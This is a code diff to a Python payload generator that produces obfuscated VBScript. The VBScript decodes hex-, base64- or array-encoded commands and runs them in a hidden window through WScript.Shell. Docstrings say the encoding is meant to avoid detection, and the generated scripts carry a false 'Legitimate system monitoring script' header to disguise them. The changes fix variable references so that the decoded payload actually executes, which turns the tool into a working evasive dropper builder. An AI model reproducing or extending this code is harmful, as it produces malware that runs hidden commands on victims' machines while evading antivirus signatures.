@@ -67,32 +67,36 @@ End With
 """
         return vbs_code.strip()
 
-    def create_hex_decoder_vbs(self, text: str) -> str:
-        """Create VBS code that decodes hex-encoded string"""
+    def create_hex_decoder_vbs(self, text: str) -> Tuple[str, str]:
+        """Create VBS code that decodes hex-encoded string. Returns (code, output_var)"""
         hex_encoded, var_name = self.encode_string_hex(text)
         func_name = self._generate_random_name("DecodeHex")
+        output_var = self._generate_random_name("decoded_")
 
         vbs_code = f"""
 Function {func_name}(h)
     Dim i, r
+    r = ""
     For i = 1 To Len(h) Step 2
         r = r & Chr(CLng("&H" & Mid(h, i, 2)))
     Next
     {func_name} = r
 End Function
-Dim {var_name}
-{var_name} = {func_name}("{hex_encoded}")
+Dim {output_var}
+{output_var} = {func_name}("{hex_encoded}")
 """
-        return vbs_code.strip()
+        return vbs_code.strip(), output_var
 
-    def create_array_concatenation_decoder(self, text: str) -> str:
-        """Encode string using array concatenation to avoid detection"""
+    def create_array_concatenation_decoder(self, text: str) -> Tuple[str, str]:
+        """Encode string using array concatenation to avoid detection. Returns (code, output_var)"""
         # Split string into chunks and encode each
         chunks = [text[i : i + 16] for i in range(0, len(text), 16)]
 
-        var_name = self._generate_random_name("a_")
+        idx_var = self._generate_random_name("idx_")
+        inner_idx_var = self._generate_random_name("i_")
         arr_var = self._generate_random_name("arr_")
         out_var = self._generate_random_name("s_")
+        chunk_var = self._generate_random_name("c_")
 
         vbs_code = f"Dim {arr_var}({len(chunks)-1})\n"
 
@@ -101,15 +105,16 @@ Dim {var_name}
             vbs_code += f'{arr_var}({i}) = "{encoded_chunk}"\n'
 
         vbs_code += f"""
-Dim {out_var}
-For Each {var_name} In {arr_var}
-    Dim i
-    For i = 1 To Len({var_name}) Step 2
-        {out_var} = {out_var} & Chr(CLng("&H" & Mid({var_name}, i, 2)))
+Dim {out_var}, {idx_var}, {inner_idx_var}, {chunk_var}
+{out_var} = ""
+For {idx_var} = 0 To UBound({arr_var})
+    {chunk_var} = {arr_var}({idx_var})
+    For {inner_idx_var} = 1 To Len({chunk_var}) Step 2
+        {out_var} = {out_var} & Chr(CLng("&H" & Mid({chunk_var}, {inner_idx_var}, 2)))
     Next
 Next
 """
-        return vbs_code.strip()
+        return vbs_code.strip(), out_var
 
     def obfuscate_command(self, command: str) -> str:
         """Wrap command in obfuscated execution wrapper"""
@@ -129,33 +134,38 @@ Set {shell_var} = CreateObject("WScript.Shell")
         """Create complete obfuscated VBS payload"""
 
         # Start with environment variable randomization to avoid signature detection
+        sys_ver_var = self._generate_random_name("sysVer")
+        env_path_var = self._generate_random_name("envPath")
         obf_header = f"""
 ' Legitimate system monitoring script
 Option Explicit
 On Error Resume Next
 
-Dim {self._generate_random_name("sysVer")}, {self._generate_random_name("envPath")}
-{self._generate_random_name("sysVer")} = CreateObject("WScript.Shell").Environment("System")("OS")
-{self._generate_random_name("envPath")} = CreateObject("WScript.Shell").Environment("User")("PATH")
+Dim {sys_ver_var}, {env_path_var}
+{sys_ver_var} = CreateObject("WScript.Shell").Environment("System")("OS")
+{env_path_var} = CreateObject("WScript.Shell").Environment("User")("PATH")
 """
 
         # Add main obfuscated payload
         if encoding_method == "base64":
+            payload_var = self._generate_random_name("payload_")
             payload_section = self.create_base64_decoder_vbs(
-                payload_command, self._generate_random_name("payload_")
+                payload_command, payload_var
             )
         elif encoding_method == "hex":
-            payload_section = self.create_hex_decoder_vbs(payload_command)
+            payload_section, payload_var = self.create_hex_decoder_vbs(payload_command)
         else:
-            payload_section = self.create_array_concatenation_decoder(payload_command)
+            payload_section, payload_var = self.create_array_concatenation_decoder(payload_command)
 
-        # Execution wrapper
+        # Execution wrapper - properly reference the decoded payload variable
         exec_var = self._generate_random_name("f_")
 
         execution_section = f"""
 Dim {exec_var}
 Set {exec_var} = CreateObject("WScript.Shell")
-{exec_var}.Run {self._generate_random_name("payload_")}, 0, False
+On Error Resume Next
+{exec_var}.Run {payload_var}, 0, False
+On Error GoTo 0
 Set {exec_var} = Nothing
 """
 
@@ -164,10 +174,13 @@ Set {exec_var} = Nothing
 
     def create_wscript_hidden_execution(self, command: str) -> str:
         """Create hidden WScript execution that runs without visible window"""
+        shell_var = self._generate_random_name("shell_")
+        cmd_var = self._generate_random_name("cmd_")
+
         vbs_code = f"""
-Dim {self._generate_random_name("shell_")}, {self._generate_random_name("cmd_")}
-Set {self._generate_random_name("shell_")} = CreateObject("WScript.Shell")
-{self._generate_random_name("shell_")}.Run "cmd /c {command}", 0, False
+Dim {shell_var}, {cmd_var}
+Set {shell_var} = CreateObject("WScript.Shell")
+{shell_var}.Run "cmd /c {command}", 0, False
 """
         return vbs_code.strip()
 
@@ -196,32 +209,38 @@ End If
 
         if encoding == "base64":
             encoded_payload, _ = self.encode_string_base64(payload)
+            func_name = self._generate_random_name("DecodeB64")
+            payload_var = self._generate_random_name("enc_payload_")
             decoder = f"""
-Function {self._generate_random_name("DecodeB64")}(s)
+Function {func_name}(s)
     Dim xmlDoc, node
     Set xmlDoc = CreateObject("MSXML2.DOMDocument")
     xmlDoc.LoadXML "<root><![CDATA[" & s & "]]></root>"
-    {self._generate_random_name("DecodeB64")} = xmlDoc.DocumentElement.text
+    {func_name} = xmlDoc.DocumentElement.text
 End Function
 
-Dim {self._generate_random_name("enc_payload_")} : {self._generate_random_name("enc_payload_")} = "{encoded_payload}"
+Dim {payload_var} : {payload_var} = "{encoded_payload}"
 """
         elif encoding == "hex":
             encoded_payload, _ = self.encode_string_hex(payload)
+            func_name = self._generate_random_name("DecodeHex")
+            payload_var = self._generate_random_name("enc_payload_")
             decoder = f"""
-Function {self._generate_random_name("DecodeHex")}(h)
+Function {func_name}(h)
     Dim i, r
+    r = ""
     For i = 1 To Len(h) Step 2
         r = r & Chr(CLng("&H" & Mid(h, i, 2)))
     Next
-    {self._generate_random_name("DecodeHex")} = r
+    {func_name} = r
 End Function
 
-Dim {self._generate_random_name("enc_payload_")} : {self._generate_random_name("enc_payload_")} = "{encoded_payload}"
+Dim {payload_var} : {payload_var} = "{encoded_payload}"
 """
         else:
             encoded_payload, _ = self.encode_string_base64(payload)
-            decoder = f"""Dim {self._generate_random_name("enc_payload_")} : {self._generate_random_name("enc_payload_")} = "{encoded_payload}" """
+            payload_var = self._generate_random_name("enc_payload_")
+            decoder = f"""Dim {payload_var} : {payload_var} = "{encoded_payload}" """
 
         return decoder
 
